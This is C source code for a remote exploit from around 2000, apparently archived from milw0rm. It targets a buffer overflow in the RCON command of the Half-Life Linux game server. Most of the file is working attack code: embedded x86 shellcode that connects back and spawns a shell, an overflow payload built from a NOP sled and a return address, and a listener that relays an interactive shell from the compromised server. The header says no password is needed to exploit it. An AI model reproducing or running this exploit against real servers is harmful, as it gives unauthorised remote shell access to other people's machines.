/*
 *  SDI HalfLife rcon remote exploit for linux x86
 *  (portuguese) exploit remoto para o buffer overflow do rcon no halflife
 *  
 *  Tamandua Sekure Labs (Sao Paulo - Porto Alegre, Brazil)
 *  by Thiago Zaninotti (c0nd0r) <condor@sekure.org>
 *     Gustavo Scotti   (csh)    <csh@sekure.org>
 *  
 *  Proof of concept - There is a remote exploitable buffer overflow
 *  in Half Life server (3.1.0.x) for linux (HLDS). The problem is 
 *  related to the RCON command (Remote CONsole).
 *  (port.) Existe um buffer overflow exploitavel no Half Life Server
 *  (HLDS) relacionado ao comando RCON.
 *  
 *  After several tests, we found out the 'rcon' command is also vulnerable
 *  to a format string attack which can also lead to a remote exploit.
 *  (port) O comando RCON tambem e' vulneravel a um format string attack.
 *  
 *  YOU DO NOT NEED THE RCON PASSWORD TO EXPLOIT THIS VULNERABILITY, 
 *  which means any multiplayer server is vulnerable to the attack.
 *  (port) Voce nao precisa de password para explorar esta vulnerabilidade,
 *    o que significa que qualquer servidor e' vulneravel.
 *  
 *  Agradecimentos: Tamandua Sekure Labs, Fabio Ramos (framos@axur.org), 
 *  Eduardo Freitas, Marcos Sposito, Roberto Monteiro (casper),
 *  Nelson Britto (stderr), Sabrina Monteiro, Gabriel Zaninotti e 
 *  Felipe Salum. A todos os leitores da Best of Security Brasil (BOS-BR).
 *  
 *  Respects: c_orb, el8.org (specially duke), meta, guys at core sdi, 
 *  the "infame" TOXYN.ORG (pt rocks) - r00t, pr0m, horizon, plaguez, 
 *  ratao and p.ulh.as/promisc.net crew. Greetz to AXUR.ORG too! guys at
 *  sekure.org: vader, jamez, falcon and staff.
 *  
 *  also thanks to botman (botman@mailandnews.com).
 *  Visit the brazilian security portal: http://www.securenet.com.br
 */

#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netdb.h>

typedef unsigned long	u32;
typedef unsigned short	u16;
typedef unsigned char	u8;

unsigned char shellcode[]=
  "\xeb\x03\x5e\xeb\x1d\xe8\xf8\xff\xff\xff scotti@axur.org"
  "\x2f\x62\x69\x6e\x2f"
  "\x73\x68\x40\x31\xc0\x66\x40\x66\x40\x66\x89\x06\x31\xc9\xb1\x08"
  "\x89\xf7\x83\xc7\x08\x30\xc0\x88\x07\x47\x49\x75\xfa\x31\xc0\x89"
  "\x46\x28\x40\x89\x46\x24\x40\x89\x46\x20\x8d\x4e\x20\x31\xdb\x43"
  "\x31\xc0\x83\xc0\x66\xcd\x80\x89\xc7\x89\x46\x20\x8d\x06\x89\x46"
  "\x24\x31\xc0\x83\xc0\x10\x89\x46\x28\x8d\x4e\x20\x31\xdb\x43\x43"
  "\x43\x31\xc0\x83\xc0\x66\x57\xcd\x80\x5f\x31\xc0\x83\xc0\x3f\x89"
  "\xfb\x31\xc9\xcd\x80\x31\xc0\x83\xc0\x3f\x31\xdb\x31\xc9\x41\xcd"
  "\x80\x31\xc0\x83\xc0\x3f\x31\xdb\x31\xc9\x41\x41\xcd\x80\x89\xf0"
  "\x83\xc0\x18\x89\x46\x18\x31\xc0\x88\x46\x17\x89\x46\x1c\xb0\x0b"
  "\x8d\x4e\x18\x8d\x56\x1c\x89\xf3\x83\xc3\x10\xcd\x80\x31\xc0\x40"
  "\xcd\x80";

/* NET functions */
int
udp_read( int sock, u32 *daddr, u16 *port, void *ptr, u16 ptr_size)
{
        struct sockaddr_in server;
        int i,n;
        i = sizeof(server);
        n=recvfrom( sock, ptr, ptr_size, 0, (struct sockaddr *)&server, &i);
        *daddr = ntohl(server.sin_addr.s_addr);
        *port = ntohs(server.sin_port);
        return n;
}

int
udp_send( int sock, u32 daddr, u16 port, void *ptr, u16 ptr_size)
{
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons( port);
        server.sin_addr.s_addr = htonl( daddr);
        return sendto( sock, ptr, ptr_size, 0, (struct sockaddr *)&server, sizeof(server));
}

int
udp_connect( u32 addr, u16 port)
{
        struct sockaddr_in client;
        int new_fd;

        new_fd = socket( AF_INET, SOCK_DGRAM, 0);
        if (new_fd<0)
           return new_fd;

        bzero( (char *) &client, sizeof( client));
        client.sin_family = AF_INET;
        client.sin_addr.s_addr = htonl( addr);
        client.sin_port = htons( port);
        if (connect( new_fd, (struct sockaddr *)&client, sizeof(client))<0)
           return -1; /* cant bind local address */

        return new_fd;
}

u32 dns2ip( u8 *host)
{
        struct hostent *dns;
        u32     saddr;
        dns = gethostbyname( host);
        if (!dns)
           return 0xffffffff;
        bcopy( (char *)dns->h_addr, (char *)&saddr, dns->h_length);
        return ntohl(saddr);
}

int
async_read( int sock_r, int rettime)
{
   fd_set           fd_r;
   struct timeval   tv;
   char             try_ch[4]="/-\\|";

   int r,j;

   for (r=0;r<rettime;r++)
       {
       for (j=0;j<20;)
           {
           int i;

           printf("\b%c", try_ch[(j%4)]);
           fflush(stdout);

           FD_ZERO( &fd_r);
           FD_SET( sock_r, &fd_r);

	   tv.tv_sec  = 0;
	   tv.tv_usec = 50000;
           
	   i =select( sock_r + 1, &fd_r, NULL, NULL, &tv);
           if (!i) { j++; continue; }
           if (i>0)
	      if (FD_ISSET(sock_r, &fd_r)) return sock_r;
           else
              return -1;
           }
       }
   return -1;
}

int
get_server_info( int sock, u32 addr, u16 port)
{
   u32 r_addr;
   u16 r_port;
   int n, i;
   u8  pkt[256], *str;

   pkt[0] = pkt[1] = pkt[2] = pkt[3] = 0xff;
   sprintf(&pkt[4], "details");

   n = udp_send(sock, addr, port, pkt, strlen(pkt));
   printf(".  connecting to the server...  "); fflush(stdout);
   if (async_read(sock, 6)<0)
       goto server_down;
   n = udp_read(sock, &addr, &port, pkt, sizeof(pkt));
   if (n<0)
	{
server_down:
	printf("\bserver down!\r*\n");
	exit(0);
	}
   printf("\bdone\n");
   str = &pkt[4]; 
   str+=strlen(str)+1;
   printf("\t server_name  [%s]\n", str); str+=strlen(str)+1;
   printf("\t    map_name  [%s]\n", str); str+=strlen(str)+1;
   str+=strlen(str)+1;

   printf("\t   game_name  [%s]\n", str); str+=strlen(str)+1;
   printf("\tusers_online  [%d of %d]\n", str[0], str[1]); str+=3;
   printf("\t   remote_OS  [%s]\n", (str[1]=='w' ? "windows" : (str[1]=='l' ? "linux" : "unknown")));
   if (str[1]=='w') return 2;
   if (str[1]=='l') return 1;
   return 0;
}

u32 retrieve_local_info(int sock, u8 *host)
{
   struct sockaddr_in server;
   int    soclen;
   soclen = sizeof(server);
   if (getsockname(sock, (struct sockaddr *)&server, &soclen)<0)
       {
       printf("error in getsockname\n");
       exit(0);
       }
   snprintf(host, 256, "%s:%d", inet_ntoa(server.sin_addr), htons(server.sin_port));
   return htonl(server.sin_addr.s_addr);
}

int 
bind_tcp( int *port)
{
   struct sockaddr_in mask_addr;
   int sock, portno=25000; /* base_port */

   sock = socket( AF_INET, SOCK_STREAM, 0);
   if (sock<0)
      return sock;

redo:
   mask_addr.sin_family = AF_INET;
   mask_addr.sin_port = htons( portno);
   mask_addr.sin_addr.s_addr = 0;

   if (bind(sock, (struct sockaddr *)&mask_addr, sizeof(mask_addr))<0)
      {
error:
      portno++;
      if (portno>26000)
         {
         printf("*  no TCP port to bind in.\n");
         exit(0);
         }
      goto redo;
      }
   if (listen( sock, 0)<0)
      goto error;

   printf(".  TCP listen port number %d\n", portno);
   *port = portno;
   return sock;
}

wait_for_connect(int sock)
{
   fd_set fds;
   u8     tmp[256];
   int    tcp, addr_len;
   struct sockaddr_in server;

   printf(".  waiting for connect_back shellcode responde...  ");
   if (async_read(sock, 15)!=sock)
	{
  	printf("\bfailed!\r*\n");
        exit(0);
        }
    tcp = accept( sock, (struct sockaddr *)&server, &addr_len);
    printf("\bconnected\n.       ^---> from %s:%d\n", inet_ntoa(server.sin_addr), ntohs(server.sin_port));
    close(sock); /* closing incoming socket */
    printf(".  congratulations. you have owned this one.\n");

    
    /* basic async mode */
    while (1)
        {
        FD_ZERO(&fds);
        FD_SET(0, &fds);
        FD_SET(tcp, &fds);
       
        if (select(tcp+1, &fds, NULL, NULL, NULL)>0)
           {
           if (FD_ISSET(0, &fds))
              {
              int n;
              n = read(0, tmp, 256);
              if (n<0)
                 goto end_conn;
              if (write(tcp, tmp, n)!=n) goto end_conn;
              }
           if (FD_ISSET(tcp, &fds))
              {
              int n;
              n = read(tcp, tmp, 256);
              if (n<0)
                 goto end_conn;

              if (write(0, tmp, n)!=n) goto end_conn;
              }
	   }
	}
end_conn:
    close(tcp);
    printf(".  bye-bye. Stay tuned for more Tamandua Sekure Labs codes.\n");  
}

assembly_shell_code(int sock, u32 addr, u16 port, u32 laddr, u8 *linfo)
{
   u8    pkt[2048], 
         *shell_ptr;
   struct sockaddr_in *sc_server;
   u32   ret_addr = 0xbfffb1f4, last_byte = 1014, over_head = 40;
   int   i, n, tcp, tcp_port;

   printf(".  localinfo %s\n", linfo);
   tcp = bind_tcp( &tcp_port);
   sc_server = (struct sockaddr_in *)&shellcode[10];
   sc_server->sin_addr.s_addr = htonl(laddr);
   sc_server->sin_port = htons(tcp_port);

   last_byte-=strlen(linfo);
   pkt[0] = pkt[1] = pkt[2] = pkt[3] = 0xff;
   sprintf( &pkt[4], "rcon ");
   i = strlen(pkt);
   shell_ptr = &pkt[i];

   /* find out how many nops we can push before shellcode */
   n = last_byte - i - sizeof(shellcode)-1 - over_head;
   for (i=0;i<n;i++)
       shell_ptr[i] = 0x90; /* nop */
   shell_ptr+=i;

   /* fill in the shellcode */
   for (i=0;i<sizeof(shellcode)-1;i++)
       shell_ptr[i] = shellcode[i];
   shell_ptr+=i;

   /* fill in the overhead buffer */
   for (i=0;i<over_head;i++)
       shell_ptr[i] = '-';
   shell_ptr+=i;

   /* fill return address and ebp */
   *(u32 *)shell_ptr = ret_addr; shell_ptr+=4;
   *(u32 *)shell_ptr = ret_addr; shell_ptr+=4;

   /* finalize string */
   *shell_ptr = 0;

   n = udp_send( sock, addr, port, pkt, strlen(pkt));
   printf(".  sending poison code. %d bytes sent\n",n);
   wait_for_connect(tcp);
}

usage()
{
   printf("\n.  usage: hl-rcon <server ip[:port]>\n");
   exit(-1);
}

main(int argc, char **argv)
{
   u32 addr, laddr;
   u16 port;

   int sock, i;
   u8  linfo[256], *tmp = NULL;

   printf(".  half-life 3.1.0.x remote buffer-overflow for linux x86\n");
   printf(".  (c)2000, Tamandua Sekure Laboratories\n");
   printf(".  Authors: Thiago Zaninotti & Gustavo Scotti\n");

   if (argc<2)
      usage();

   tmp = (u8 *)strchr(argv[1], ':');
   if (tmp)
      {
      *tmp = 0; tmp++;
      port = atoi(tmp);
      }
   else
      {
      printf(":  port not found, using default 27015\n");
      port = 27015;
      }

   addr = dns2ip(argv[1]);

   if (addr==0xffffffff)
      {
      printf("host not found!\n");
      exit(0);
      }

   sock = udp_connect( addr, port);
   laddr = retrieve_local_info(sock, linfo);
   if (get_server_info(sock, addr, port)!=1)
      {
      printf("this is not a linux server. Make a shellcode to it and have fun\n");
      exit(0);
      }
   assembly_shell_code(sock, addr, port, laddr, linfo); 
   
}

// milw0rm.com [2000-11-16]
